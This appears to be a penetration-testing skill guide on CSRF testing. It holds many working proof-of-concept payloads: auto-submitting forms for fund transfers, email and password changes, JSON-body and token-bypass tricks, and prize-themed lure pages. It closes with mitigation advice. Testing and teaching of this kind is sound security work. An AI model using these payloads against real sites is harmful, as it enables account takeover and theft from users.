# Cross-Site Request Forgery (CSRF) Testing

---
name: Cross-Site Request Forgery (CSRF) Testing
description: This skill should be used when the user asks to "test for CSRF vulnerabilities," "create CSRF proof of concept exploits," "bypass anti-CSRF token protections," "validate CSRF mitigation controls," or "exploit cross-site request forgery in web applications." It provides comprehensive guidance for detecting, exploiting, and remediating CSRF vulnerabilities.
version: 1.0.0
tags: [csrf, web-security, penetration-testing, session-security, access-control]
---

## Purpose

Provide systematic methodologies for identifying and exploiting Cross-Site Request Forgery (CSRF) vulnerabilities in web applications. This skill covers CSRF attack mechanics, proof-of-concept creation, token bypass techniques, testing methodologies, and mitigation strategies for preventing unauthorized state-changing actions on behalf of authenticated users.

## Inputs / Prerequisites

- **Target Web Application**: URL of application with state-changing functionality
- **Authenticated User Session**: Valid login credentials for testing
- **Proxy Tool**: Burp Suite or similar for request interception and modification
- **HTML/JavaScript Knowledge**: Ability to craft malicious payloads
- **Authorization**: Written permission for security testing activities

## Outputs / Deliverables

- **CSRF Vulnerability Report**: Documentation of exploitable endpoints
- **Proof of Concept HTML**: Working exploit demonstrating vulnerability
- **Token Analysis**: Assessment of anti-CSRF token implementation
- **Impact Assessment**: Business impact of identified vulnerabilities
- **Remediation Recommendations**: Specific fixes for discovered issues

## Core Workflow

### 1. Understand CSRF Attack Mechanics

#### Attack Flow
```
1. User authenticates to target website (bank.com)
2. Browser stores session cookie: sessionid=abcd1234
3. Attacker crafts malicious request targeting sensitive action
4. User visits attacker-controlled page while still authenticated
5. Malicious page triggers request to target site
6. Browser automatically includes session cookie
7. Server processes request as legitimate user action
```

#### Why CSRF Works
- Browsers automatically attach cookies to same-origin requests
- Server trusts requests containing valid session cookies
- No mechanism verifies user intent for each action
- Cross-origin requests can trigger state changes

### 2. Identify Vulnerable Endpoints

#### Review Application Behavior
```
Target endpoints that perform state-changing actions:
- Password/email changes: POST /account/update
- Money transfers: POST /transfer
- Settings modifications: POST /settings/save
- Administrative actions: POST /admin/delete-user
- Shopping cart operations: POST /cart/add
- Profile updates: POST /profile/edit
```

#### Capture and Analyze Requests
```http
# Intercept state-changing request with Burp Suite
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: sessionid=abcd1234
Content-Type: application/x-www-form-urlencoded

email=newuser@email.com
```

### 3. Test for CSRF Protections

#### Check for Anti-CSRF Tokens
```http
# Look for token in form or headers
POST /transfer HTTP/1.1
Host: bank.com
Cookie: sessionid=abcd1234

amount=1000&account=12345&csrf_token=xyz789
```

**Testing Token Validation:**
```
1. Remove token entirely → Does request succeed?
2. Use empty token value → Does request succeed?
3. Use token from different session → Does request succeed?
4. Modify token characters → Does request succeed?
5. Reuse old token → Does request succeed?
```

#### Check Referer/Origin Header Validation
```http
# Remove Referer header
POST /transfer HTTP/1.1
Host: bank.com
# Referer: (removed)

# Modify Referer header
POST /transfer HTTP/1.1
Host: bank.com
Referer: https://attacker.com/csrf.html
```

#### Check HTTP Method Handling
```
# If POST is protected, try GET
Original: POST /transfer?amount=1000
Attempt:  GET /transfer?amount=1000

# Some applications accept both methods
```

### 4. Create CSRF Proof of Concept

#### Hidden Form Auto-Submit
```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>
    
    <!-- Hidden CSRF form -->
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="amount" value="5000">
        <input type="hidden" name="account" value="attacker-account">
    </form>
    
    <script>
        // Auto-submit form on page load
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

#### Image Tag GET Request
```html
<!-- Triggers GET request when image loads -->
<img src="https://bank.com/transfer?amount=1000&account=attacker123" 
     width="0" height="0" style="display:none;">

<!-- Alternative with error handling -->
<img src="https://target.com/action?param=value" 
     onerror="this.style.display='none'">
```

#### XHR-Based CSRF (for CORS Misconfiguration)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("amount=5000&account=attacker123");
</script>
```

#### iFrame-Based CSRF
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf-form" action="https://target.com/action" 
      method="POST" target="csrf-frame">
    <input type="hidden" name="param1" value="malicious">
    <input type="hidden" name="param2" value="data">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 5. Token Bypass Techniques

#### Token in Cookie (Double Submit Bypass)
```html
<!-- If token is only validated against cookie -->
<script>
// Set attacker-controlled token in cookie
document.cookie = "csrf_token=attacker_value; domain=.target.com";
</script>

<form action="https://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_value">
    <input type="hidden" name="action" value="malicious">
</form>
```

#### Token Tied to Non-Session Cookie
```
# If CSRF token cookie is separate from session
1. Obtain valid CSRF token from any session
2. Use this token across different user sessions
3. Token may be valid for all users
```

#### Token Validation Based on Request Method
```html
<!-- If only POST is validated, try changing to GET -->
<img src="https://target.com/action?csrf_token=&amount=5000">

<!-- Or convert POST body to GET parameters -->
```

## Quick Reference

### CSRF Testing Checklist

| Test | Method | Vulnerability Indicator |
|------|--------|------------------------|
| Remove CSRF token | Delete token parameter | Request succeeds |
| Empty token value | Set token="" | Request succeeds |
| Different session token | Use another user's token | Request succeeds |
| Predictable token | Analyze token entropy | Low randomness |
| Token in URL | Check token exposure | Token in GET parameters |
| Static token | Same token across sessions | Token never changes |
| Remove Referer | Delete header | Request succeeds |
| Spoof Referer | Change to attacker.com | Request succeeds |
| Method override | POST → GET | Action executes |

### Common CSRF Payload Templates

| Scenario | Template |
|----------|----------|
| POST form | `<form action="URL" method="POST"><input name="param" value="val"></form>` |
| GET image | `<img src="URL?param=value">` |
| Auto-submit | `<script>document.forms[0].submit()</script>` |
| JSON body | XHR with `Content-Type: text/plain` (bypass preflight) |
| Delayed submit | `setTimeout(function(){form.submit()}, 2000)` |

### Anti-CSRF Token Validation Tests

| Test Case | Expected Secure Behavior |
|-----------|-------------------------|
| Token missing | Request rejected (400/403) |
| Token empty | Request rejected |
| Token from other session | Request rejected |
| Token modified | Request rejected |
| Expired token | Request rejected |
| Reused token (one-time use) | Request rejected |

## Constraints and Limitations

### Operational Boundaries
- Modern browsers implement SameSite cookie defaults (Lax)
- CORS policies may block cross-origin requests
- Content-Type restrictions limit some attack vectors
- Framework-level protections increasingly common
- Token-based APIs may not be vulnerable

### Attack Limitations
- Requires victim to be authenticated
- Victim must visit attacker-controlled page
- Cannot read response (blind attack)
- Complex multi-step actions harder to exploit
- CAPTCHA/re-authentication blocks exploitation

### Legal Requirements
- Only test applications with written authorization
- Document all testing activities and findings
- Do not exploit real user sessions
- Report findings through proper channels

## Examples

### Example 1: Basic Email Change CSRF
```html
<!-- save as csrf_email.html -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="https://target.com/account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="confirm_email" value="attacker@evil.com">
    </form>
</body>
</html>

<!-- Host on attacker server and send link to victim -->
```

### Example 2: Money Transfer CSRF
```html
<!DOCTYPE html>
<html>
<head><title>Congratulations!</title></head>
<body>
    <h1>You've won $1,000,000!</h1>
    <p>Please wait while we process your prize...</p>
    
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form id="csrf" action="https://bank.com/transfer" method="POST" target="csrf-frame">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="recipient" value="attacker-account-123">
        <input type="hidden" name="memo" value="Prize payment">
    </form>
    
    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

### Example 3: GET-Based CSRF via Image
```html
<!-- For applications that accept GET for state changes -->
<html>
<body>
    <h1>Check out this funny image!</h1>
    
    <!-- Hidden CSRF request -->
    <img src="https://shop.com/add-to-cart?item=123&quantity=100" 
         width="1" height="1" style="opacity:0">
    
    <img src="https://shop.com/checkout?confirm=true" 
         width="1" height="1" style="opacity:0">
    
    <!-- Actual funny image to distract victim -->
    <img src="funny-cat.jpg" width="500">
</body>
</html>
```

### Example 4: Token Bypass - Empty Value
```html
<!-- Test if empty token is accepted -->
<form action="https://target.com/password/change" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
    <input type="hidden" name="csrf_token" value="">
</form>
<script>document.forms[0].submit();</script>
```

### Example 5: JSON Body CSRF
```html
<!-- For APIs that accept JSON -->
<html>
<body>
<form action="https://api.target.com/user/update" method="POST" 
      enctype="text/plain">
    <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- Results in body: {"email":"attacker@evil.com","padding":"="} -->
</body>
</html>
```

### Example 6: Real-World Gmail CSRF (Historical)
```html
<!-- 2007 Gmail forwarding exploit -->
<img src="https://mail.google.com/mail/?view=up&act=cf&forward=attacker@gmail.com">

<!-- When victim visited malicious page while logged into Gmail,
     their email forwarding was changed to attacker's address -->
```

## Troubleshooting

### Issue: CSRF Attack Blocked by SameSite Cookie
**Cause**: Modern browsers default to SameSite=Lax
**Solution**:
```
# SameSite=Lax allows GET requests from cross-origin navigation
1. Convert POST to GET if application accepts it
2. Use top-level navigation: <a href="target.com/action?params">

# SameSite=None required for cross-origin POSTs
# If cookie has SameSite=Strict, CSRF is largely mitigated
```

### Issue: CORS Blocking XHR Requests
**Cause**: Browser enforces same-origin policy
**Solution**:
```html
<!-- Use form submission instead of XHR -->
<form action="https://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value">
</form>

<!-- For JSON APIs, try text/plain content type -->
<form enctype="text/plain" ...>
```

### Issue: Token Regenerates on Each Request
**Cause**: Strict one-time token implementation
**Solution**:
```
# This is secure implementation
1. Document as "properly implemented CSRF protection"
2. Check if token is tied to session correctly
3. Look for token leakage via Referer header
4. Check if token appears in URL (potential exposure)
```

### Issue: Referer Header Check Blocks Attack
**Cause**: Server validates request origin
**Solution**:
```html
<!-- Some browsers/proxies strip Referer -->
<!-- Meta tag to suppress Referer -->
<meta name="referrer" content="no-referrer">

<!-- Check if empty Referer is accepted -->
<!-- Check if partial match is used (target.com.attacker.com) -->
```

### Issue: Action Requires User Interaction
**Cause**: Application uses confirmation dialogs or CAPTCHA
**Solution**:
```
# These are mitigating controls
1. Document as defense-in-depth measure
2. Check if confirmation can be bypassed via parameters
3. Look for API endpoints that skip confirmation
4. Test mobile/API versions of same functionality
```

## Mitigation Guidance

### Implement Anti-CSRF Tokens
```html
<!-- Server generates unique token per session/request -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="generated_random_token_xyz">
    <input type="text" name="amount">
    <button type="submit">Transfer</button>
</form>
```

### Configure SameSite Cookie Attribute
```http
# Strict: Never send cookie cross-origin
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly

# Lax: Send only with top-level GET navigations
Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly
```

### Validate Referer/Origin Headers
```python
# Server-side validation example
def validate_origin(request):
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')
    
    allowed_origins = ['https://trusted-site.com']
    
    if origin and origin not in allowed_origins:
        return False
    if referer and not referer.startswith('https://trusted-site.com'):
        return False
    return True
```

### Require Re-Authentication for Sensitive Actions
```
# For critical operations:
1. Password changes → Require current password
2. Fund transfers → Require 2FA confirmation
3. Account deletion → Email/SMS verification
4. Admin actions → Session timeout + re-auth
```

### Use Framework Security Features
```python
# Django CSRF middleware (enabled by default)
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
]

# Template usage
<form method="POST">
    {% csrf_token %}
    <!-- form fields -->
</form>
```
